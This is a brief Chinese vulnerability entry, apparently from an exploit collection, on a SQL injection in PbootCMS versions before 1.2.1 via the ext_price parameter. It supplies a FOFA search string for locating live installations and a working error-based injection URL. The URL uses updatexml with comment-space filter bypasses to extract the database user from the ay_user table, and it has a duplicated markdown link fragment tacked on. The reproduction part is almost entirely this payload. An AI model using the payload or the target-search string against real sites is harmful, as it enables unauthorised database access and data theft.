---
title: PbootCMS ext_price SQL注入漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - CMS漏洞
 - PbootCMS
---

# PbootCMS ext_price SQL注入漏洞

## 漏洞描述

PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

> [!NOTE]
>
> PbootCMS < 1.2.1

## FOFA

> [!NOTE]
>
> app="PBOOTCMS"

## 漏洞复现

主页

![image-20210702113507454](/img/20210924020206686151.png)

测试 Payload

```
/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
```

![image-20210702113552582](/img/20210924020210444841.png)